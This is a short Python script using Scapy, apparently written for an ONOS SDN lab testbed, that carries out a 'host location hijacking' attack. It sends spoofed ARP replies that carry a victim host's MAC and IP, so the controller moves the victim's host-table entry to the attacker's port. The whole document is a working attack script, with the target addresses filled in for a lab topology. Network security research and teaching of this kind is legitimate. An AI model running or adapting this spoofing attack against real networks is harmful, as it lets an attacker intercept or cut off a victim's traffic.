#!/usr/bin/env python3
"""Host Location Hijacking - one-shot (flips the victim's host-table entry)."""
from scapy.all import Ether, ARP, sendp

VICTIM_MAC     = "00:00:00:00:00:02"   # h1's MAC (confirm in ONOS 'hosts')
VICTIM_IP      = "10.0.10.11"          # h1's IP (routed topology)
ATTACKER_IFACE = "atk-eth0"

pkt = Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") / \
      ARP(op=2, hwsrc=VICTIM_MAC, psrc=VICTIM_IP,
          hwdst="ff:ff:ff:ff:ff:ff", pdst=VICTIM_IP)

print(f"[*] Impersonating victim {VICTIM_IP} ({VICTIM_MAC}) out of {ATTACKER_IFACE}")
sendp(pkt, iface=ATTACKER_IFACE, count=5, inter=1, verbose=True)
print("[*] Done. Check ONOS 'hosts' - h1 should have moved to the attacker's port.")
